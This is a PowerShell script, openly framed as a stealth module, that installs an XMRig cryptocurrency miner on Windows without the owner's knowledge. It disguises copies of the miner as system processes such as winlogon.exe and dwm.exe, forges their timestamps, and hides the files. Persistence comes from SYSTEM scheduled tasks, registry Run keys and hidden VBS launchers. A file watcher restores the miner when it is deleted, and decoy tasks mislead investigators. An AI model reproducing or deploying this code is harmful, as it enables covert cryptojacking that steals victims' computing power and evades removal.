# Process Masquerading Module
# Creates legitimate-looking system processes for stealth operation

param(
    [switch]$Install,
    [switch]$Deploy
)

$ErrorActionPreference = "SilentlyContinue"

function Write-StealthLog {
    param([string]$Message)
    try {
        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') $Message" | Out-File -FilePath "$env:TEMP\system_audio.log" -Append -Encoding UTF8
    } catch { }
}

# Legitimate Windows process names that blend in
$LegitimateProcesses = @{
    "audiodg.exe" = @{
        Description = "Windows Audio Device Graph Isolation"
        Company = "Microsoft Corporation"
        Location = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv"
    }
    "AudioSrv.exe" = @{
        Description = "Windows Audio Service"
        Company = "Microsoft Corporation" 
        Location = "C:\ProgramData\Microsoft\Windows\WindowsUpdate"
    }
    "dwm.exe" = @{
        Description = "Desktop Window Manager"
        Company = "Microsoft Corporation"
        Location = "C:\ProgramData\Microsoft\Network\Downloader"
    }
    "winlogon.exe" = @{
        Description = "Windows Logon Application"
        Company = "Microsoft Corporation"
        Location = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\.cache"
    }
}

function Copy-MinerWithNewIdentity {
    param([string]$SourcePath, [string]$TargetPath, [string]$ProcessName)
    
    try {
        if (Test-Path $SourcePath) {
            $targetDir = Split-Path $TargetPath
            if (-not (Test-Path $targetDir)) {
                New-Item -Path $targetDir -ItemType Directory -Force | Out-Null
            }
            
            # Copy the miner with new name
            Copy-Item -Path $SourcePath -Destination $TargetPath -Force
            
            # Set file attributes to match Windows system files
            $referenceFile = "C:\Windows\System32\audiodg.exe"
            if (Test-Path $referenceFile) {
                $refInfo = Get-Item $referenceFile
                $newFile = Get-Item $TargetPath
                
                $newFile.CreationTime = $refInfo.CreationTime
                $newFile.LastWriteTime = $refInfo.LastWriteTime
                $newFile.LastAccessTime = $refInfo.LastAccessTime
            }
            
            # Hide the file
            attrib +h +s $TargetPath
            
            Write-StealthLog "Created disguised miner: $ProcessName at $TargetPath"
            return $true
        }
    } catch {
        Write-StealthLog "Failed to create disguised miner: $ProcessName"
        return $false
    }
    
    return $false
}

function Install-ProcessMasquerading {
    Write-StealthLog "Installing process masquerading system..."
    
    $sourceMiner = "$PSScriptRoot\miner_src\xmrig.exe"
    if (-not (Test-Path $sourceMiner)) {
        $sourceMiner = "$PSScriptRoot\xmrig.exe"
    }
    
    if (-not (Test-Path $sourceMiner)) {
        Write-StealthLog "Source miner not found"
        return $false
    }
    
    $successCount = 0
    foreach ($processName in $LegitimateProcesses.Keys) {
        $processInfo = $LegitimateProcesses[$processName]
        $targetPath = Join-Path $processInfo.Location $processName
        
        if (Copy-MinerWithNewIdentity -SourcePath $sourceMiner -TargetPath $targetPath -ProcessName $processName) {
            $successCount++
            
            # Create matching config for each location
            $configPath = Join-Path $processInfo.Location "config.json"
            if (Test-Path "$PSScriptRoot\config.json") {
                Copy-Item "$PSScriptRoot\config.json" $configPath -Force
                attrib +h +s $configPath
            }
        }
    }
    
    Write-StealthLog "Process masquerading installed: $successCount legitimate processes created"
    return ($successCount -gt 0)
}

function Install-StealthLaunchers {
    Write-StealthLog "Deploying stealth launchers..."
    
    foreach ($processName in $LegitimateProcesses.Keys) {
        $processInfo = $LegitimateProcesses[$processName]
        $targetPath = Join-Path $processInfo.Location $processName
        $configPath = Join-Path $processInfo.Location "config.json"
        
        if ((Test-Path $targetPath) -and (Test-Path $configPath)) {
            # Create VBS launcher for invisible startup
            $vbsPath = Join-Path $processInfo.Location "start_$($processName.Replace('.exe', '')).vbs"
            $vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run """$targetPath"" --config=""$configPath"" --daemon", 0, False
"@
            $vbsContent | Set-Content -Path $vbsPath -Encoding UTF8
            attrib +h +s $vbsPath
            
            # Create scheduled task with legitimate name
            $taskName = $processInfo.Description -replace " ", ""
            schtasks /create /tn "$taskName" /tr "wscript.exe ""$vbsPath""" /sc onstart /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
            schtasks /create /tn "$taskName`_Logon" /tr "wscript.exe ""$vbsPath""" /sc onlogon /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
            
            Write-StealthLog "Created stealth launcher for: $processName"
        }
    }
}

function Enable-AntiRemoval {
    Write-StealthLog "Enabling anti-removal mechanisms..."
    
    foreach ($processName in $LegitimateProcesses.Keys) {
        $processInfo = $LegitimateProcesses[$processName]
        $targetDir = $processInfo.Location
        
        if (Test-Path $targetDir) {
            # Create file system watcher to recreate deleted files
            $watcherScript = @"
`$watcher = New-Object System.IO.FileSystemWatcher
`$watcher.Path = "$targetDir"
`$watcher.Filter = "$processName"
`$watcher.NotifyFilter = [System.IO.NotifyFilters]::FileName

Register-ObjectEvent -InputObject `$watcher -EventName Deleted -Action {
    Start-Sleep -Seconds 5
    if (Test-Path "$PSScriptRoot\miner_src\xmrig.exe") {
        Copy-Item "$PSScriptRoot\miner_src\xmrig.exe" "$targetDir\$processName" -Force
        attrib +h +s "$targetDir\$processName"
    }
}

`$watcher.EnableRaisingEvents = `$true
while (`$true) { Start-Sleep -Seconds 30 }
"@
            
            $watcherPath = Join-Path $targetDir "file_watcher.ps1"
            $watcherScript | Set-Content -Path $watcherPath -Encoding UTF8
            attrib +h +s $watcherPath
            
            # Start the watcher
            Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File ""$watcherPath""" -WindowStyle Hidden
            
            # Multiple registry persistence entries
            reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "$($processInfo.Description)" /t REG_SZ /d "wscript.exe ""$targetDir\start_$($processName.Replace('.exe', '')).vbs""" /f 2>&1 | Out-Null
            reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "$($processInfo.Description)" /t REG_SZ /d "wscript.exe ""$targetDir\start_$($processName.Replace('.exe', '')).vbs""" /f 2>&1 | Out-Null
        }
    }
    
    Write-StealthLog "Anti-removal mechanisms activated"
}

function New-ProcessDecoys {
    Write-StealthLog "Creating process decoys to confuse detection..."
    
    # Create fake processes that look suspicious to distract from real ones
    $decoyNames = @("crypto_miner.exe", "bitcoin_mine.exe", "monero_cpu.exe")
    
    foreach ($decoy in $decoyNames) {
        $decoyPath = Join-Path $env:TEMP $decoy
        # Create fake executable that does nothing
        "ping localhost > nul" | Set-Content -Path $decoyPath -Encoding UTF8
        
        # Make it visible and suspicious-looking to draw attention
        $fakeTask = "Suspicious_$decoy"
        schtasks /create /tn $fakeTask /tr $decoyPath /sc once /st 23:59 /f 2>&1 | Out-Null
        
        Write-StealthLog "Created decoy process: $decoy"
    }
}

# Main execution
Write-StealthLog "Process masquerading module activated"

if ($Install) {
    Install-ProcessMasquerading
    Install-StealthLaunchers
    Enable-AntiRemoval
    New-ProcessDecoys
    Write-StealthLog "Complete stealth system deployed"
    
} elseif ($Deploy) {
    Install-StealthLaunchers
    
} else {
    # Default: Full installation
    Install-ProcessMasquerading
    Install-StealthLaunchers 
    Enable-AntiRemoval
    Write-StealthLog "Default stealth deployment completed"
}
